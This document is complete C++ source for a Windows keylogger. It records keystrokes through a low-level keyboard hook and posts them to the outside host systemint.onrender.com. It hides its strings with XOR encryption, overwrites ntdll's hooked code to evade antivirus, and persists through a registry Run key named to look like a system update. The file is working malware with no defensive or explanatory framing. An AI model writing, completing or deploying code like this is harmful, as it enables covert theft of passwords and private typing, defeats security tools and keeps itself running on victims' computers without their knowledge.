#include <windows.h>
#include <winhttp.h>
#include <winternl.h>
#include <psapi.h>
#include <string>
#include <vector>
#include <array>

#pragma comment(lib, "winhttp.lib")

// --- 1. COMPILE-TIME STRING ENCRYPTION ---
template <size_t N>
class XorStr {
    std::array<char, N> _data;
public:
    constexpr XorStr(const char* str) : _data{} {
        for (size_t i = 0; i < N; ++i) _data[i] = str[i] ^ 0x57; 
    }
    std::string decrypt() const {
        std::string out;
        for (size_t i = 0; i < N; ++i) out += _data[i] ^ 0x57;
        return out;
    }
};
#define X(str) XorStr<sizeof(str)>(str).decrypt().c_str()

// --- 2. INDIRECT SYSCALL GLOBALS ---
extern "C" {
    DWORD sys_number;
    ULONG_PTR sys_addr;
    // We use this to protect memory during unhooking
    NTSTATUS DoIndirectSyscall(HANDLE h, PVOID* base, PSIZE_T size, ULONG newProt, PULONG oldProt);
}

// --- 3. THE KEYLOGGER LOGIC ---
HHOOK hKeyHook = NULL;
std::string logBuffer = "";

void UploadData(std::string data) {
    HINTERNET hSession = WinHttpOpen(L"Update/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    // Decrypting URL "systemint.onrender.com" only in RAM
    std::wstring wideUrl(X("systemint.onrender.com"), X("systemint.onrender.com") + strlen(X("systemint.onrender.com")));
    HINTERNET hConnect = WinHttpConnect(hSession, wideUrl.c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/api/sync", NULL, NULL, NULL, WINHTTP_FLAG_SECURE);

    std::string json = "{\"type\":\"Keylogger\", \"data\":\"" + data + "\"}";
    WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, (LPVOID)json.c_str(), (DWORD)json.length(), (DWORD)json.length(), 0);
    WinHttpReceiveResponse(hRequest, NULL);

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* k = (KBDLLHOOKSTRUCT*)lParam;
        if (k->vkCode >= 0x30 && k->vkCode <= 0x5A) logBuffer += (char)k->vkCode;
        if (k->vkCode == VK_RETURN && !logBuffer.empty()) {
            UploadData(logBuffer);
            logBuffer.clear();
        }
    }
    return CallNextHookEx(hKeyHook, nCode, wParam, lParam);
}

// --- 4. NTDLL UNHOOKING (Blinds AV) ---
void CleanNtdll() {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    MODULEINFO mi;
    GetModuleInformation(GetCurrentProcess(), ntdll, &mi, sizeof(mi));
    
    // Read clean copy from System32
    HANDLE file = CreateFileA("C:\\Windows\\System32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    HANDLE map = CreateFileMapping(file, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    LPVOID cleanAddr = MapViewOfFile(map, FILE_MAP_READ, 0, 0, 0);

    PIMAGE_NT_HEADERS nt = reinterpret_cast<PIMAGE_NT_HEADERS>((char*)ntdll + ((PIMAGE_DOS_HEADER)ntdll)->e_lfanew);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER sect = (PIMAGE_SECTION_HEADER)((char*)IMAGE_FIRST_SECTION(nt) + (sizeof(IMAGE_SECTION_HEADER) * i));
        if (strcmp((char*)sect->Name, ".text") == 0) {
            DWORD old;
            void* dest = (char*)ntdll + sect->VirtualAddress;
            VirtualProtect(dest, sect->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &old);
            memcpy(dest, (char*)cleanAddr + sect->VirtualAddress, sect->Misc.VirtualSize);
            VirtualProtect(dest, sect->Misc.VirtualSize, old, &old);
        }
    }
    UnmapViewOfFile(cleanAddr);
    CloseHandle(map);
    CloseHandle(file);
}

// --- 5. MAIN ENTRY ---
int WINAPI WinMain(HINSTANCE hI, HINSTANCE hP, LPSTR lp, int nS) {
    CleanNtdll();

    // Set Persistence (XOR Encrypted)
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, X("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        char path[MAX_PATH];
        GetModuleFileNameA(NULL, path, MAX_PATH);
        RegSetValueExA(hKey, X("WindowsSystemUpdate"), 0, REG_SZ, (BYTE*)path, (DWORD)strlen(path));
        RegCloseKey(hKey);
    }

    // Start Stealth Keylogger
    hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    return 0;
}
